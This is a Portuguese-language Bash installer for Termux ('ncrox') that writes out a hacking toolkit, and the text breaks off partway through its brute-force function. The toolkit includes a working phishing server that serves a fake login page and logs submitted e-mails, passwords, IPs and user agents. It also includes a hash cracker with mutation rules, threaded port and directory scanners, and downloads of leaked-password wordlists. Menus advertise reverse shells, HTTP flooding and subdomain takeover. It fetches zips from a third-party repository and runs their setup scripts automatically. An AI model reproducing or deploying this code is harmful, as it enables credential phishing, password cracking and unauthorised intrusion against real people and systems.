#!/data/data/com.termux/files/usr/bin/bash
# ==========================================================================
#  Uso: bash ncrox.sh [install|update|restore]
# ==========================================================================
set -uo pipefail

REPO="https://github.com/N3CR0-X/ncrox.git"
HACK_REPO="N3CR0-X/ncroxhack"
NCROX_HOME="$HOME/.ncrox"
SRC="$NCROX_HOME/src"
LIB="$NCROX_HOME/lib/ncrox_lib.sh"
BK="$NCROX_HOME/backup"
TOOLS="$NCROX_HOME/tools"
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
BIN="$PREFIX/bin"

if [ -t 1 ]; then
  O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
  G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; R=$'\e[0m'
else
  O=; B=; D=; G=; RD=; R=
fi

ART=' _   _  ____ ____   ___  __  __
| \ | |/ ___|  _ \ / _ \ \ \/ /
|  \| | |   | |_) | | | | \  /
| . ` | |___|  _ <| |_| | /  \
|_|\__|\____|_| \_\\___//_/\_\'

banner() {
  printf '\n%s%s%s\n' "$O" "$ART" "$R"
  printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
  printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
  printf '%s   help | ncrox for hack | ncx-port | ncx-dir | ncx-brute | ncx-flood%s\n' "$D" "$R"
  printf '%s   ncx-rev | ncx-phish | ncx-crack | ncx-takeover%s\n\n' "$D" "$R"
}

need_termux() {
  [ -n "${PREFIX:-}" ] && [ -d "$PREFIX" ] || {
    printf '%s[!]%s Isto não parece ser Termux. Rode dentro do app Termux oficial.\n' "$RD" "$R"; exit 1; }
}

deps() {
  printf '%s[*]%s atualizando índices e instalando dependências...\n' "$B" "$R"
  yes | pkg update -y >/dev/null 2>&1 || true
  for p in python git curl openssl-tool dnsutils whois jq findutils ncurses-utils termux-tools \
           ncat netcat-openbsd rlwrap gzip tar unzip zip; do
    command -v "${p%%-*}" >/dev/null 2>&1 || pkg install -y "$p" >/dev/null 2>&1 || true
  done
  printf '%s[+]%s dependências prontas\n' "$G" "$R"
}

fetch_ncrox() {
  mkdir -p "$NCROX_HOME"
  if [ -d "$SRC/.git" ]; then
    printf '%s[*]%s repositório já presente, atualizando...\n' "$B" "$R"
    git -C "$SRC" pull --ff-only >/dev/null 2>&1 || true
  else
    printf '%s[*]%s clonando ncrox...\n' "$B" "$R"
    if git clone --depth 1 "$REPO" "$SRC" >/dev/null 2>&1; then
      printf '%s[+]%s fonte ncrox em %s\n' "$G" "$R" "$SRC"
    else
      printf '%s[!]%s clone falhou — a réplica em Bash cobre todos os comandos.\n' "$RD" "$R"
      mkdir -p "$SRC"
    fi
  fi
}

write_hacktools() {
  mkdir -p "$TOOLS"
  cat > "$TOOLS/crack.py" <<'PY'
#!/usr/bin/env python3
import sys, hashlib, argparse
from multiprocessing import Pool, cpu_count

def detect(h):
    if h.startswith(('$2a$', '$2b$', '$2y$')): return 'bcrypt'
    return {32: 'md5', 40: 'sha1', 64: 'sha256', 96: 'sha384', 128: 'sha512'}.get(len(h), 'md5')

def leet(w):
    m = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '5'}
    return ''.join(m.get(c, c) for c in w)

def gen(lines, rules):
    for w in lines:
        w = w.strip()
        if not w: continue
        yield w
        if 'c' in rules:
            yield w.capitalize(); yield w.upper(); yield w.lower()
        if 'l' in rules:
            yield leet(w); yield leet(w.lower())
        if 'd' in rules:
            for d in '0123456789': yield w + d
            for y in range(1990, 2027): yield w + str(y)
        if 's' in rules:
            for s in '!@#123': yield w + s

ALG = TARGET = None

def check(c):
    if ALG == 'bcrypt':
        try:
            import crypt
            return c if crypt.crypt(c, TARGET) == TARGET else None
        except Exception:
            return None
    try:
        if hashlib.new(ALG, c.encode('utf-8', 'ignore')).hexdigest().lower() == TARGET.lower():
            return c
    except Exception:
        pass
    return None

def main():
    global ALG, TARGET
    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument('hash'); ap.add_argument('-r', default='cdsl'); ap.add_argument('-t', type=int, default=0)
    a = ap.parse_args()
    ALG, TARGET = detect(a.hash), a.hash
    workers = a.t if a.t > 0 else cpu_count()
    if ALG == 'bcrypt': workers = 1
    lines = list(sys.stdin)
    total = len(lines)
    print(f'[i] algoritmo: {ALG} · {total} palavras · {workers} processos', file=sys.stderr)
    if not total: sys.exit('wordlist vazia')
    with Pool(workers) as p:
        for i, r in enumerate(p.imap_unordered(check, gen(lines, a.r), chunksize=300)):
            if r:
                p.terminate()
                print(f'\n[+] QUEBRADO: {r}\n    {ALG}: {a.hash}')
                sys.exit(0)
            if i and i % 5000 == 0:
                print(f'\r[i] {i} testados', end='', file=sys.stderr)
    print('\n[-] não quebrou com esta lista/regras', file=sys.stderr)
    sys.exit(1)

if __name__ == '__main__':
    main()
PY

  cat > "$TOOLS/phish.py" <<'PY'
#!/usr/bin/env python3
import sys, os, json, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PORT, PAGE, REDIR, LOG = int(sys.argv[1]), sys.argv[2], sys.argv[3], sys.argv[4]

FALLBACK = """<!doctype html><meta charset=utf-8><title>__T__</title>
<style>
body{margin:0;height:100vh;display:grid;place-items:center;background:#08080C;color:#D7DCE5;
font-family:system-ui,sans-serif}
form{width:320px;padding:28px;border:1px solid #1E90FF33;border-radius:14px;background:#0E0E15;
box-shadow:0 0 40px #1E90FF22}
h1{margin:0 0 4px;font-size:20px;color:#FF7A00}p{font-size:12px;color:#7a8090;margin:0 0 18px}
input{width:100%;box-sizing:border-box;margin-bottom:10px;padding:11px;border-radius:8px;
border:1px solid #2a2f3a;background:#12121a;color:#fff;font-size:14px}
button{width:100%;padding:11px;border:0;border-radius:8px;background:#FF7A00;color:#08080C;
font-weight:700;font-size:14px;cursor:pointer}
small{display:block;margin-top:14px;text-align:center;color:#5A5F6B;font-size:11px}
</style>
<form method=post>
<h1>__T__</h1><p>informe suas credenciais para continuar</p>
<input name=email placeholder="e-mail ou usuário" autofocus>
<input name=senha type=password placeholder="senha">
<button>entrar</button><small>satanachia · ncrox</small>
</form>"""

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def _send(self, code, body, ctype='text/html; charset=utf-8'):
        b = body.encode()
        self.send_response(code)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        if self.path.startswith('/_capturas'):
            try: data = open(LOG, encoding='utf-8').read()
            except OSError: data = 'nenhuma captura ainda'
            return self._send(200, '<pre style="color:#3DDC84;background:#08080C;padding:16px">' + data.replace('<','&lt;') + '</pre>')
        try: html = open(PAGE, encoding='utf-8', errors='ignore').read()
        except OSError: html = ''
        if not html.strip(): html = FALLBACK.replace('__T__', os.environ.get('PHISH_TITLE', 'Acesso restrito'))
        self._send(200, html)

    def do_POST(self):
        n = int(self.headers.get('Content-Length') or 0)
        raw = self.rfile.read(n).decode('utf-8', 'ignore')
        dados = {k: v[0] for k, v in parse_qs(raw).items()}
        linha = json.dumps({'hora': datetime.datetime.now().isoformat(timespec='seconds'),
                            'ip': self.client_address[0],
                            'ua': self.headers.get('User-Agent', ''),
                            'dados': dados}, ensure_ascii=False)
        with open(LOG, 'a', encoding='utf-8') as f: f.write(linha + '\n')
        print('\n[+] CAPTURA ' + ' '.join(f'{k}={v}' for k, v in dados.items()) + f'  ({self.client_address[0]})', flush=True)
        self.send_response(302); self.send_header('Location', REDIR or '/_capturas'); self.end_headers()

ThreadingHTTPServer(('0.0.0.0', PORT), H).serve_forever()
PY
  chmod +x "$TOOLS"/*.py
  printf '%s[+]%s auxiliares python instalados\n' "$G" "$R"
}

write_lib() {
  mkdir -p "$(dirname "$LIB")"
  cat > "$LIB" <<'LIBEOF'
#!/usr/bin/env bash
# ncrox replica lib — auditoria, rede, utils, ofensivo, wordlists e nhack
NCROX_REPO_DIR="$HOME/.ncrox/src"
WL_DIR="$HOME/.ncrox/wordlists"
HACK_DIR="$HOME/.ncrox/hack"
HACK_REPO="N3CR0-X/ncroxhack"
WL_BASE="https://raw.githubusercontent.com/danielmiessler/SecLists/master"
if [ -t 1 ]; then
  O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
  G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; Y=$'\e[38;2;255;200;0m'; R=$'\e[0m'
else
  O=; B=; D=; G=; RD=; Y=; R=
fi
_hr(){ printf '%s────────────────────────────────────────────%s\n' "$D" "$R"; }
_tag(){ printf '\n%s┌─ %s%s\n%s└%s\n' "$O" "$1" "$R" "$O" "$R"; }

ncx_banner(){
  printf '\n%s _   _  ____ ____   ___  __  __%s\n' "$O" "$R"
  printf '%s| \\ | |/ ___|  _ \\ / _ \\ \\ \\/ /%s\n' "$O" "$R"
  printf '%s|  \\| | |   | |_) | | | | \\  /%s\n' "$O" "$R"
  printf '%s| . ` | |___|  _ <| |_| | /  \\%s\n' "$O" "$R"
  printf '%s|_|\\__|\\____|_| \\_\\\\___//_/\\_\\%s\n' "$O" "$R"
  printf '%ssatanachia · termux edition%s\n' "$B" "$R"
}

ncx_help(){
  _tag "ncrox · comandos"
  cat <<'H'
 AUDITORIA (portado do ncrox)
   vigia <host> [portas]      varredura TCP em host único
   oraculo <dominio>          resolução DNS A/AAAA
   bastiao <host> [porta]     TLS: protocolo, cifra e validação de cert
   selo <arquivo> [sha256]    SHA-256 local e comparação

 REDE / WEB
   dns <dominio> | whois <dominio> | net | ip a
   search <termo>             busca web (Bing RSS)
   web get|title|links|status|headers <url>
   github repo|user|releases|issues|search <x>
   ondeuto -ip                geolocalização do IP público

 OFENSIVO AGRESSIVO
   ncx-port     <host> [top|all|lista] [-t N] [-b]
   ncx-dir      <url> [-w lista] [-t N] [-x ext]
   ncx-brute    <url> <campo_user> <campo_pass> [-u users] [-p passes] [-s texto_ok]
   ncx-flood    <url> [-c conc] [-n req] [-m metodo]
   ncx-sub      <dominio> [-w lista]
   ncx-takeover <dominio> [-w lista] [-t N]
   ncx-crack    <hash> [-w lista] [-r regras] [-t N]
   ncx-phish    <porta> [url_alvo] [-t titulo] [-d destino] [-r template]

 REVERSE SHELL
   ncx-rev <lhost> <lport> [-t tipo] [-a] [-u] [-b] [-i] [-l]
   ncx-listen <porta>                           (ncat > nc > busybox, com rlwrap)

 NHACK (repositório de ferramentas)
   ncrox for hack | nhack list | nhack search <termo>
   nhack pick <tool.zip> | nhack -st <tool.zip> [--no-run]
   nhack get <tool.zip> | nhack installed | nhack rm <tool>

 WORDLISTS (SecLists comprimido em gzip)
   ncx-wordlists list | update | get <nome> | rockyou | clean
   -w aceita nome da lista, caminho de arquivo ou .gz

 UTILITÁRIOS
   hash | base64 enc|dec | urlinfo | jsoncheck | comparar | fileinfo
   uuid | netcheck | sysinfo | disk | which | where | findtext | rede
   tree | readmd | device | battery | storage | screen | uptime
   locale | timezone | volume | ringer | say | open | pack | docs | applist
   tasklist | settings | help | ncrox-update | ncrox-restore
H
  _hr
}

# ---------- auditoria ----------
ncx_vigia(){
  local host="${1:-}" ports="${2:-22,80,443,8080}" n=0 p ip
  [ -z "$host" ] && { echo "uso: vigia <host> [porta,porta,...]"; return 1; }
  ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
  _tag "vigia :: $host ($ip)"
  for p in ${ports//,/ }; do
    if timeout 1 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null; then
      printf '  %s%s/tcp aberta%s\n' "$G" "$p" "$R"; n=$((n+1))
    fi
  done
  _hr; printf 'abertas: %s\n' "$n"
}
ncx_oraculo(){
  local d="${1:-}"; [ -z "$d" ] && { echo "uso: oraculo <dominio>"; return 1; }
  _tag "oraculo :: $d"
  getent hosts "$d" 2>/dev/null || echo "  sem resolução"
  command -v dig >/dev/null && dig +short "$d" 2>/dev/null
  _hr
}
ncx_bastiao(){
  local h="${1:-}" p="${2:-443}"
  [ -z "$h" ] && { echo "uso: bastiao <host> [porta]"; return 1; }
  _tag "bastiao :: $h:$p"
  timeout 8 openssl s_client -connect "$h:$p" -servername "$h" </dev/null 2>&1 \
    | grep -Ei 'verify return code|protocol *:|cipher *:|subject=|issuer=' | sed 's/^/  /'
  _hr
}
ncx_selo(){
  local f="${1:-}" want="${2:-}" got
  [ -f "$f" ] || { echo "uso: selo <arquivo> [sha256]"; return 1; }
  got=$(sha256sum "$f" | awk '{print $1}')
  _tag "selo :: $f"; echo "  $got"
  if [ -n "$want" ]; then
    [ "$got" = "$want" ] && printf '  %sCONFERE%s\n' "$G" "$R" || printf '  %sDIVERGE%s\n' "$RD" "$R"
  fi; _hr
}

# ---------- web / rede ----------
ncx_search(){
  local q="${*:-}"; [ -z "$q" ] && { echo "uso: search <termo>"; return 1; }
  _tag "search :: $q"
  curl -s -m 15 "https://www.bing.com/search?q=${q// /+}&format=rss" \
   | grep -oE '<title>[^<]+</title>|<link>[^<]+</link>' | sed -e 's/<[^>]*>//g' \
   | head -12 | sed 's/^/  /'
  _hr
}
ncx_web(){
  local a="${1:-}" u="${2:-}"
  [ -z "$u" ] && { echo "uso: web get|title|links|status|headers <url>"; return 1; }
  case "$a" in
    get|source) curl -sL -m 20 "$u" | head -c 4000 ;;
    title) curl -sL -m 15 "$u" | grep -oiE '<title>[^<]*' | head -1 | sed 's/<title>//I' ;;
    links) curl -sL -m 15 "$u" | grep -oE 'href="https?://[^"]+' | sed 's/href="//' | sort -u | head -20 ;;
    status) curl -s -o /dev/null -m 15 -w 'status: %{http_code}\n' "$u" ;;
    headers) curl -sI -m 15 "$u" ;;
    open) termux-open-url "$u" 2>/dev/null || echo "$u" ;;
    *) echo "ação inválida" ;;
  esac
}
ncx_dns(){ [ -z "${1:-}" ] && { echo "uso: dns <dominio>"; return 1; }; getent hosts "$1" || echo "sem resolução"; }
ncx_whois(){ [ -z "${1:-}" ] && return 1; curl -s -m 15 "https://rdap.org/domain/$1" | head -c 2500; echo; }
ncx_net(){
  _tag "net"
  ip -o addr 2>/dev/null | awk '{print "  "$2" "$4}' || ifconfig 2>/dev/null | grep -E 'inet |^[a-z]'
  _hr
}
ncx_github(){
  local a="${1:-}" x="${2:-}"
  case "$a" in
    repo) curl -s -m 15 "https://api.github.com/repos/$x" | grep -E '"(full_name|description|stargazers_count|language|license)"' | head -6 ;;
    user) curl -s -m 15 "https://api.github.com/users/$x" | grep -E '"(login|name|public_repos|followers)"' | head -6 ;;
    releases) curl -s -m 15 "https://api.github.com/repos/$x/releases" | grep -E '"(tag_name|name)"' | head -10 ;;
    issues) curl -s -m 15 "https://api.github.com/repos/$x/issues" | grep -E '"(title|state)"' | head -10 ;;
    search) curl -s -m 15 "https://api.github.com/search/repositories?q=${x// /+}" | grep '"full_name"' | head -10 ;;
    *) echo "uso: github repo|user|releases|issues|search <x>" ;;
  esac
}
ncx_ondeuto(){ curl -s -m 12 https://ipapi.co/json/ | grep -E '"(ip|city|region|country_name|org)"'; }

# ---------- wordlists ----------
wl_catalog(){
  cat <<'C'
common|Discovery/Web-Content/common.txt
raft-dirs|Discovery/Web-Content/raft-small-directories.txt
dir23|Discovery/Web-Content/directory-list-2.3-small.txt
dns5000|Discovery/DNS/subdomains-top1million-5000.txt
namelist|Discovery/DNS/namelist.txt
10k|Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
pass-short|Passwords/Common-Credentials/top-passwords-shortlist.txt
users|Usernames/top-usernames-shortlist.txt
top1m|Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
C
}
_wl_path(){
  local n="$1"
  [ -f "$n" ] && { printf '%s' "$n"; return 0; }
  [ -f "$WL_DIR/$n.txt.gz" ] && { printf '%s' "$WL_DIR/$n.txt.gz"; return 0; }
  [ -f "$WL_DIR/$n.txt" ] && { printf '%s' "$WL_DIR/$n.txt"; return 0; }
  [ -f "$WL_DIR/$n" ] && { printf '%s' "$WL_DIR/$n"; return 0; }
  return 1
}
_wl_read(){ case "$1" in *.gz) gzip -dc "$1";; *) cat "$1";; esac; }
_wl_get(){
  local n="$1" p="$2" tmp
  mkdir -p "$WL_DIR"; tmp="$WL_DIR/$n.txt"
  if curl -fsSL -m 120 "$WL_BASE/$p" -o "$tmp" 2>/dev/null && [ -s "$tmp" ]; then
    gzip -9 -f "$tmp"
    printf '%s[+]%s %s (%s linhas)\n' "$G" "$R" "$n" "$(gzip -dc "$tmp.gz" | wc -l)"
  else
    rm -f "$tmp"; printf '%s[!]%s %s falhou\n' "$RD" "$R" "$n"
  fi
}
ncx_wordlists(){
  local a="${1:-list}"
  mkdir -p "$WL_DIR"
  case "$a" in
    list)
      _tag "wordlists locais"
      ls -1 "$WL_DIR" 2>/dev/null | sed -e 's/\.txt\.gz$//' -e 's/\.txt$//' | sort -u | sed 's/^/  /'
      [ -z "$(ls -A "$WL_DIR" 2>/dev/null)" ] && echo "  (vazio — use: ncx-wordlists update)"
      echo; echo "  catálogo: ncx-wordlists catalog" ; _hr ;;
    catalog) wl_catalog | sed 's/|/  ->  /' | sed 's/^/  /' ;;
    update) while IFS='|' read -r n p; do _wl_get "$n" "$p"; done < <(wl_catalog); _hr ;;
    get) [ -z "${2:-}" ] && { echo "uso: ncx-wordlists get <nome>"; return 1; }
         wl_catalog | awk -F'|' -v k="$2" '$1==k{print $2}' | head -1 | while read -r p; do
           [ -z "$p" ] && { echo "nome desconhecido: $2"; return 1; }; _wl_get "$2" "$p"; done ;;
    rockyou)
      _tag "rockyou (aprox. 130 MB comprimido)"
      curl -fsSL -m 900 "$WL_BASE/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -o "$WL_DIR/rockyou.tar.gz" \
        && tar xzf "$WL_DIR/rockyou.tar.gz" -C "$WL_DIR" && gzip -9 -f "$WL_DIR/rockyou.txt" \
        && rm -f "$WL_DIR/rockyou.tar.gz" && printf '%s[+]%s rockyou pronto%s\n' "$G" "$R" \
        || printf '%s[!]%s falhou (precisa de ~300 MB livres)\n' "$RD" "$R" ;;
    clean) rm -f "$WL_DIR"/*; printf '%s[+]%s wordlists removidas\n' "$G" "$R" ;;
    auto) for n in common dns5000 10k users pass-short; do
            wl_catalog | awk -F'|' -v k="$n" '$1==k{print $2}' | head -1 \
              | while read -r p; do [ -n "$p" ] && _wl_get "$n" "$p"; done; done ;;
    *) echo "uso: ncx-wordlists list|update|get <nome>|rockyou|clean|catalog" ;;
  esac
}

# ---------- nhack ----------
nhack_list(){
  _tag "ncrox for hack :: $HACK_REPO"
  local js out
  js=$(curl -fsS -m 20 "https://api.github.com/repos/$HACK_REPO/contents/" 2>/dev/null) || {
    printf '%s[!]%s repositório sem conteúdo ou inacessível.\n' "$RD" "$R"
    echo "    publique os .zip na raiz de github.com/$HACK_REPO"
    return 1; }
  out=$(printf '%s' "$js" | jq -r '.[]? | select(.name|endswith(".zip")) | "\(.name)\t\(.size)"' 2>/dev/null)
  if [ -z "$out" ]; then
    echo "  nenhum .zip publicado ainda"
  else
    printf '%s\n' "$out" | while IFS=$'\t' read -r n s; do
      printf '  %s%-36s%s %7s KB\n' "$O" "$n" "$R" "$(( ${s:-0} / 1024 ))"
    done
  fi
  echo; echo "  baixar:   nhack pick <tool.zip>"; echo "  instalar: nhack -st <tool.zip>"; _hr
}
nhack_search(){ [ -z "${1:-}" ] && { echo "uso: nhack search <termo>"; return 1; }; nhack_list | grep -i -- "$1"; }
nhack_pick(){
  local n="${1:-}"; [ -z "$n" ] && { echo "uso: nhack pick <tool.zip>"; return 1; }
  case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
  case "$n" in */*|*..*) echo "nome inválido"; return 1 ;; esac
  mkdir -p "$HACK_DIR/dl"
  local out="$HACK_DIR/dl/$n" ok=0
  _tag "nhack pick :: $n"
  if curl -fsSL -m 240 "https://raw.githubusercontent.com/$HACK_REPO/main/$n" -o "$out" 2>/dev/null && [ -s "$out" ]; then ok=1
  elif curl -fsSL -m 240 "https://github.com/$HACK_REPO/raw/main/$n" -o "$out" 2>/dev/null && [ -s "$out" ]; then ok=1; fi
  if [ "$ok" = 0 ]; then rm -f "$out"; printf '%s[!]%s não encontrado no repositório\n' "$RD" "$R"; return 1; fi
  unzip -tqq "$out" >/dev/null 2>&1 || { printf '%s[!]%s zip corrompido\n' "$RD" "$R"; rm -f "$out"; return 1; }
  printf '%s[+]%s %s (%s KB)\n' "$G" "$R" "$out" "$(( $(stat -c%s "$out") / 1024 ))"
  printf '    sha256: %s\n' "$(sha256sum "$out" | awk '{print $1}')"
  printf '    instalar: nhack -st %s\n' "$n"; _hr
}
nhack_st(){
  local run=1 n=""
  while [ $# -gt 0 ]; do case "$1" in
    --no-run) run=0; shift;; *) n="$1"; shift;; esac; done
  [ -z "$n" ] && { echo "uso: nhack -st <tool.zip> [--no-run]"; return 1; }
  case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
  local zip="$HACK_DIR/dl/$n" tool="${n%.zip}"
  [ -f "$zip" ] || { echo "não baixado: $n — use: nhack pick $n"; return 1; }
  [ -d "$HACK_DIR/$tool" ] && { printf '%s[!]%s %s já instalado (nhack rm %s)\n' "$RD" "$R" "$tool" "$tool"; return 1; }
  unzip -Z1 "$zip" | grep -qE '^/|(^|/)\.\.(/|$)' && { echo "zip com caminho absoluto ou .."; return 1; }
  mkdir -p "$HACK_DIR" "$HACK_DIR/env" "$PREFIX/bin"
  local tmp; tmp=$(mktemp -d "$HACK_DIR/.tmp.XXXXXX") || return 1
  unzip -q "$zip" -d "$tmp" || { rm -rf "$tmp"; echo "falha ao extrair"; return 1; }
  local root="$tmp" uniq
  uniq=$(find "$tmp" -mindepth 1 -maxdepth 1 | wc -l)
  if [ "$uniq" = 1 ] && [ -d "$(find "$tmp" -mindepth 1 -maxdepth 1)" ]; then
    root=$(find "$tmp" -mindepth 1 -maxdepth 1)
  fi
  mv "$root" "$HACK_DIR/$tool" || { rm -rf "$tmp"; return 1; }
  rm -rf "$tmp"
  _tag "nhack -st :: $tool"
  local f base tgt linked=0 envs=0 PIP_REQ="" SETUP=""
  while IFS= read -r -d '' f; do
    base=$(basename "$f")
    case "$base" in
      requirements.txt) PIP_REQ="$f"; continue ;;
      install.sh|setup.sh) SETUP="$f"; continue ;;
      *.env|*.conf|*.cfg) cp -f "$f" "$HACK_DIR/env/" 2>/dev/null && envs=$((envs+1)); continue ;;
    esac
    if [ "$(head -c2 "$f" 2>/dev/null)" = '#!' ] || [ -x "$f" ]; then
      chmod +x "$f"
      tgt="$PREFIX/bin/$base"
      [ -e "$tgt" ] && tgt="$PREFIX/bin/${tool}-$base"
      ln -sf "$f" "$tgt" && linked=$((linked+1))
    fi
  done < <(find "$HACK_DIR/$tool" -type f -print0)
  printf '  %s[+]%s %s link(s) em %s · %s env(s)\n' "$G" "$R" "$linked" "$PREFIX/bin" "$envs"
  printf '  pasta: %s\n' "$HACK_DIR/$tool"
  if [ -n "$PIP_REQ" ]; then
    printf '  %s[*]%s deps python em venv isolada...\n' "$B" "$R"
    if python3 -m venv "$HOME/.venvs/nhack-$tool" >/dev/null 2>&1 \
       && "$HOME/.venvs/nhack-$tool/bin/pip" install -q -r "$PIP_REQ"; then
      printf '  %s[+]%s venv: ~/.venvs/nhack-%s\n' "$G" "$R" "$tool"
    else
      printf '  %s[!]%s pip falhou\n' "$RD" "$R"
    fi
  fi
  if [ -n "$SETUP" ] && [ "$run" = 1 ]; then
    printf '  %s[*]%s executando %s\n' "$B" "$R" "$(basename "$SETUP")"
    bash "$SETUP" 2>&1 | tail -30
  fi
  printf '  remover: nhack rm %s\n' "$tool"; _hr
}
nhack_get(){
  nhack_pick "${1:-}" || return 1
  nhack_st "${1:-}"
}
nhack_installed(){
  _tag "ferramentas nhack instaladas"
  local d
  for d in "$HACK_DIR"/*/; do [ -d "$d" ] || continue
    case "$d" in */.tmp.*) continue;; esac
    printf '  %s\n' "$(basename "$d")"; done
  _hr
}
nhack_rm(){
  local t="${1:-}"; [ -z "$t" ] && { echo "uso: nhack rm <tool>"; return 1; }
  [ -d "$HACK_DIR/$t" ] || { echo "não instalado: $t"; return 1; }
  find "$PREFIX/bin" -maxdepth 1 -type l -lname "$HACK_DIR/$t/*" -delete 2>/dev/null
  rm -rf "$HACK_DIR/$t" "$HOME/.venvs/nhack-$t"
  printf '%s[+]%s removido: %s\n' "$G" "$R" "$t"
}
ncx_nhack(){
  local a="${1:-list}"; shift 2>/dev/null
  case "$a" in
    ""|list|ls|for) nhack_list ;;
    search) nhack_search "$@" ;;
    pick) nhack_pick "$@" ;;
    get) nhack_get "$@" ;;
    -st|--st|st) nhack_st "$@" ;;
    installed|-i) nhack_installed ;;
    rm|remove) nhack_rm "$@" ;;
    -h|--help) echo "uso: nhack list|search <t>|pick <zip>|-st <zip>|get <zip>|installed|rm <tool>" ;;
    *) nhack_get "$a" ;;
  esac
}

# ---------- ofensivo ----------
_portlist(){
  case "$1" in
    all) seq 1 65535 ;;
    top) printf '%s\n' 21 22 23 25 53 80 110 111 135 139 143 161 389 443 445 465 587 636 993 995 \
      1433 1521 1723 2049 2181 3000 3128 3306 3389 4443 5000 5432 5555 5900 5984 6379 7001 7002 \
      8000 8001 8008 8080 8081 8086 8090 8443 8888 9000 9090 9200 9300 10000 11211 27017 ;;
    *) printf '%s\n' "${1//,/ }" ;;
  esac
}
_probe(){
  local ip="$1" p="$2" tmo="$3" grab="$4" b=""
  if timeout "$tmo" bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null; then
    if [ "$grab" = 1 ]; then
      b=$(timeout 2 bash -c "exec 3<>/dev/tcp/$ip/$p; head -c 120 <&3" 2>/dev/null | tr -c '[:print:]\n' '.' | head -1)
    fi
    printf '%s[+] %s/tcp open%s%s\n' "$O" "$p" "$R" "${b:+  :: $b}"
  fi
}
ncx_port(){
  local host="" ports="top" thr=150 tmo=1 grab=0
  while [ $# -gt 0 ]; do case "$1" in
    -t) thr="${2:-150}"; shift 2;; -w) tmo="${2:-1}"; shift 2;; -b) grab=1; shift;;
    -h|--help) echo "uso: ncx-port <host> [top|all|p1,p2] [-t threads] [-w timeout] [-b banner]"; return 0;;
    *) [ -z "$host" ] && host="$1" || ports="$1"; shift;; esac; done
  [ -z "$host" ] && { echo "uso: ncx-port <host> [top|all|p1,p2]"; return 1; }
  local ip n=0; ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
  _tag "ncx-port :: $host ($ip) :: $ports :: ${thr} threads"
  while read -r p; do
    [ -z "$p" ] && continue
    _probe "$ip" "$p" "$tmo" "$grab" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done < <(_portlist "$ports")
  wait 2>/dev/null; _hr; echo "varredura concluída"
}
_def_dirs(){ printf '%s\n' admin api backup bin cgi-bin config css data db docs download downloads \
  env git includes inc install js lib log logs old panel php phpinfo.php private robots.txt server-status \
  src sql temp test tmp upload uploads user users wp-admin wp-config.php wp-content wp-login.php .git .env .htaccess; }
ncx_dir(){
  local url="" wl="" thr=30 ext="" codes="200,204,301,302,307,401,403" n=0 w f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; -x) ext="$2"; shift 2;;
    -c) codes="$2"; shift 2;; -h|--help) echo "uso: ncx-dir <url> [-w lista|arquivo] [-t threads] [-x ext]"; return 0;;
    *) url="$1"; shift;; esac; done
  [ -z "$url" ] && { echo "uso: ncx-dir <url> [-w lista]"; return 1; }
  url="${url%/}"
  _tag "ncx-dir :: $url :: ${thr} threads${wl:+ :: $wl}"
  _dir_one(){
    local u="$1" w="$2" e="$3" codes="$4" out code len
    out=$(curl -s -o /dev/null -m 8 -w '%{http_code} %{size_download}' "$u/$w$e")
    code="${out%% *}"; len="${out##* }"
    case ",$codes," in
      *",$code,"*) printf '%s[%s]%s %s%s  (%s bytes)\n' "$G" "$code" "$R" "$w" "$e" "$len" ;;
    esac
  }
  { if [ -n "$wl" ]; then
      if f=$(_wl_path "$wl"); then _wl_read "$f"; else echo "lista não encontrada: $wl" >&2; fi
    else
      if f=$(_wl_path common); then _wl_read "$f"; else _def_dirs; fi
    fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _dir_one "$url" "$w" "${ext:+.$ext}" "$codes" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr; echo "concluído"
}
_def_users(){ printf '%s\n' admin administrator root user teste test guest suporte; }
_def_pass(){ printf '%s\n' 123456 password 12345678 admin admin123 root toor 1234 senha 123456789 \
  qwerty 12345 111111 1234567 123123 000000 1q2w3e4r abc123 iloveyou 654321 monkey dragon 123321 \
  senha123 mudar123 P@ssw0rd admin@123 teste123; }
ncx_brute(){
  local url="" uf="" pf="" ul="" pl="" ok="" fail="" okc="" thr=20 n=0 u p f
  url="${1:-}"; uf="${2:-}"; pf="${3:-}"; shift 3 2>/dev/null
  while [ $# -gt 0 ]; do case "$1" in
    -u) ul="$2"; shift 2;; -p) pl="$2"; shift 2;; -s) ok="$2"; shift 2;;
    -f) fail="$2"; shift 2;; -c) okc="$2"; shift 2;; -t) thr="$2"; shift 2;;
    -h|--help) echo "uso: ncx-brute <url> <campo_user> <campo_pass> [-u users] [-p passes] [-s texto_ok] [-c codigo_ok]"; return 0;;
    *) shift;; esac; done
